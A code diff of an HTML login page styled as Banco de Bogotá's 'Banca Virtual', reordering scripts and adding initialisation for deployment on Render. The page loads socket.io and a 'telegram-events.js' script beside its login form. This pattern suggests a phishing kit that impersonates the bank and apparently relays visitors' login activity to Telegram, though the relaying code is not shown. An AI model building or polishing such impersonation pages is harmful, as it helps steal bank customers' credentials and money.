@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>    <meta charset="UTF-8">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banca Virtual - Banco de Bogotá</title>
     <link rel="icon" type="image/png" sizes="32x32" href="Imagenes/channels4_profile-removebg-preview.png">
@@ -8,11 +9,21 @@
     <link rel="icon" type="image/png" sizes="192x192" href="Imagenes/channels4_profile-removebg-preview.png">
     <link rel="stylesheet" href="index.css">
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Scripts simplificados para Render -->
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <script src="js/loading-overlay.js"></script>
+    <script src="js/config.js"></script>
     <script src="js/common.js"></script>
+    <script src="js/loading-overlay.js"></script>
     <script src="js/telegram-events.js"></script>
+    
     <script>
+        // Inicialización simplificada
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM cargado, iniciando aplicación en Render...');
+            window.commonUtils.initializeCommon();
+        });
+
         // Verificar si hay mensaje de error al cargar la página
         window.addEventListener('DOMContentLoaded', () => {
             const errorMessage = sessionStorage.getItem('errorMessage');
@@ -22,12 +33,10 @@
                     loginAlert.style.display = 'block';
                     loginAlert.querySelector('p').textContent = errorMessage;
                 }
-                // Limpiar el mensaje después de mostrarlo
                 sessionStorage.removeItem('errorMessage');
             }
         });
     </script>
-    <script src="index.js" defer></script>
 </head>
 <body>    <div class="container">
         <section class="login-section">
